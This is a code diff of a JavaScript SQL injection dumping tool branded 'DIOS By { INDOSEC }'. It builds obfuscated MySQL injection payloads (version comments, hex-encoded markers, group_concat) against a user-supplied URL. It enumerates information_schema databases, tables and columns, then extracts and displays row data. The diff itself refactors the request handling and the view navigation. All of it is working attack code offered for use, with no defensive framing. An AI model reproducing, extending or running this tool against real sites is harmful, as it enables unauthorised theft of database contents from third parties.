@@ -9,7 +9,7 @@ $(document).ready(function () {
     let res_thead = '<thead class="bg-gray-50" id="thead_template"></thead>'
     let res_tbody = '<tbody class="bg-white divide-y divide-gray-200" id="tbody_template"></tbody>'
 
-    const regex = /<inject>(.*?)<\/inject>/g;
+    
 
     document.title = "DIOS By { INDOSEC }";
 
@@ -42,6 +42,21 @@ $(document).ready(function () {
         return `/*!50000%43o%4Ec%41t/**12345**/(${stringtohex('<inject>')},/*!50000gROup_cONcat(${string}),${stringtohex("</inject> <!--")})*/`
     }
 
+    function request(url) {
+        return $.ajax({
+            url: url,
+            success: function(data) {
+                return data;
+            }        
+        });
+    }
+
+    function regexs(output) {
+        const regex = /<inject>(.*?)<\/inject>/g;
+        match = regex.exec(output)
+        return match[1]
+    }
+
     async function setUrl() {
         const {
             value: url
@@ -52,7 +67,7 @@ $(document).ready(function () {
         })
 
         if (url) {
-            urls = url
+            urls = url.replace("%20", "+")
             tampilan()
         }
     }
@@ -109,18 +124,14 @@ $(document).ready(function () {
         urlinject = urlinject.replace('{::}', PayloadConcat('schema_name'))
         urlinject = urlinject.replace('+--+-', '+from+/*!50000inforMAtion_schema*/.schemata+--+-')
 
-        let res = await $.get(urlinject)
-
-        try {
-            let m = regex.exec(res)
-            databases = m[1]
-            viewDatabase()
-        } catch (error) {
-            setDatabase()
-        }
+        let res = await request(urlinject)
+        databases = await regexs(res)
+        viewDatabase()
     }
 
     async function viewDatabase() {
+
+        $("#showtable").hide()
         let splitdb = databases.split(",")
         let number = 1
 
@@ -168,27 +179,21 @@ $(document).ready(function () {
 
         $("#data").html(database)
         $("#showtable").show()
-        $("#showcolum").hide()
 
         urlinject = urlinject.replace('{::}', PayloadConcat('table_name'))
         urlinject = urlinject.replace('+--+-', `+from+/*!50000inforMAtion_schema*/.tables+/*!50000wHEre*/+/*!50000taBLe_scheMA*/like+${stringtohex(database)}+--+-`)
 
-        let res = await $.get(urlinject)
-        
-        try {
-            let m = regex.exec(res)
-            tables = m[1]
-            viewTable()
-        } catch (error) {
-            setTable(database)
-        }
-            
+        let res = await request(urlinject)
+        tables = await regexs(res)
+        viewTable()
+
         $("#backdb").on('click', function () {
-            setDatabase()
+            viewDatabase()
         })
     }
 
     async function viewTable() {
+        $("#showcolum").hide()
         let splitable = tables.split(",")
         let number = 1
         let thead_col = ["No.", "Tables", "Action"]
@@ -236,21 +241,15 @@ $(document).ready(function () {
         $("#nametable").html(table)
 
         $("#backtable").on('click', function () {
-            setTable(database_select)
+            viewTable()
         })
 
         urlinjection = urlinjection.replace('{::}', PayloadConcat('column_name'))
-        urlinjection = urlinjection.replace('+--+-', `+from+/*!50000inforMAtion_schema*/.columns+/*!50000wHEre*/+/*!50000taBLe_name*/=CHAR(${stringtochar(table_select)})+--+-`)
+        urlinjection = urlinjection.replace('+--+-', `+from+/*!50000inforMAtion_schema*/.columns+/*!50000wHEre*/+/*!50000taBLe_name*/=CHAR(${stringtochar(table)})+--+-`)
 
-        let res = await $.get(urlinjection)
-
-        try {
-            m = regex.exec(res)
-            columns = m[1]
-            viewColumns()
-        } catch (error) {
-            setColumns(table)
-        }
+        let res = await request(urlinjection)
+        columns = await regexs(res)
+        viewColumns()
 
     }
 
@@ -265,22 +264,18 @@ $(document).ready(function () {
                 </th>
             `)
         });
-        setData()
-        setData()
+        setData(table_select)
     }
 
-    async function setData() {
+    async function setData(table) {
         columns_select = columns.replace(/,/g, `,${stringtohex('{:::}')},`)
 
         let urlinjection = urls
         urlinjection = urlinjection.replace('{::}', PayloadConcat(columns_select))
-        urlinjection = urlinjection.replace('+--+-', `+from+${database_select}.${table_select}+--+-`)
+        urlinjection = urlinjection.replace('+--+-', `+from+${database_select}.${table}+--+-`)
 
-        let res = await $.get(urlinjection)
-
-        m = regex.exec(res)
-
-        dataTable = m[1]
+        let res = await request(urlinjection)
+        dataTable = await regexs(res)
         viewData()
     }
 
@@ -289,13 +284,20 @@ $(document).ready(function () {
 
         for (let index = 0; index < splitData.length; index++) {
             $("#tbody_template").append("<tr>")
+            
+            // if (splitData[index].search(/^[^\s]+(\s+[^\s]+)*$/) > 0) {
+            //     console.log(splitData[index])
+            // }
+            // // console.log(splitData[index])
+
             let splitDatacol = splitData[index].split("{:::}")
+
             splitDatacol.forEach(dataCol => {
-                $("#tbody_template").append(`
-                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
-                        ${dataCol}
-                    </td>
-                        `)
+                    $("#tbody_template").append(`
+                        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
+                                    ${dataCol}
+                        </td>
+                    `)
             })
             $("#tbody_template").append("</tr>")
         }
